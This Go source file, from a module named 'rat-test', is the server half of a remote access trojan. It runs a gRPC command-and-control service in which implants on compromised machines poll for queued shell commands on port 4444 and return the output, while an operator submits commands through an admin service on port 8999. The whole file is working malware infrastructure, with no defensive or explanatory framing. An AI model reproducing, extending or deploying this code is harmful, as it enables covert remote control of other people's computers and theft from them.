package main

import (
	"context"
	"errors"
	"log"
	"net"
	"rat-test/grpcapi"

	"google.golang.org/grpc"
)

type ImplantServer struct {
	work, output chan *grpcapi.Command
}

type AdminServer struct {
	work, output chan *grpcapi.Command
}

func NewImplantServer(work, output chan *grpcapi.Command) *ImplantServer {
	implantServer := new(ImplantServer)
	implantServer.work = work
	implantServer.output = output
	return implantServer
}

func NewAdminServer(work, output chan *grpcapi.Command) *AdminServer {
	adminServer := new(AdminServer)
	adminServer.work = work
	adminServer.output = output
	return adminServer
}

func (iser *ImplantServer) FetchCommand(ctx context.Context, in *grpcapi.Empty) (*grpcapi.Command, error) {
	cmd := new(grpcapi.Command)
	select {
	case cmd, ok := <-iser.work:
		if ok {
			return cmd, nil
		}
		return cmd, errors.New("work channel was closed")
	default:
		return cmd, nil
	}
}

func (iser *ImplantServer) SendOutput(ctx context.Context, result *grpcapi.Command) (*grpcapi.Empty, error) {
	iser.output <- result
	return &grpcapi.Empty{}, nil
}

func (aser *AdminServer) RunCommand(ctx context.Context, cmd *grpcapi.Command) (*grpcapi.Command, error) {
	var res *grpcapi.Command
	go func() {
		aser.work <- cmd
	}()
	res = <-aser.output
	return res, nil
}

func main() {
	work, output := make(chan *grpcapi.Command), make(chan *grpcapi.Command)
	implantServer := NewImplantServer(work, output)
	adminServer := NewAdminServer(work, output)

	var opts []grpc.ServerOption

	implantGrpcServer := grpc.NewServer(opts...)
	adminGrpcServer := grpc.NewServer(opts...)
	grpcapi.RegisterImplantServer(implantGrpcServer, implantServer)
	grpcapi.RegisterAdminServer(adminGrpcServer, adminServer)

	implantListener, err := net.Listen("tcp", ":4444")
	if err != nil {
		log.Fatalln(err)
	}

	adminListener, err := net.Listen("tcp", ":8999")
	if err != nil {
		log.Fatalln(err)
	}

	go func() {
		if err = implantGrpcServer.Serve(implantListener); err != nil {
			log.Fatalln(err)
		}
	}()
	if err = adminGrpcServer.Serve(adminListener); err != nil {
		log.Fatalln(err)
	}
}
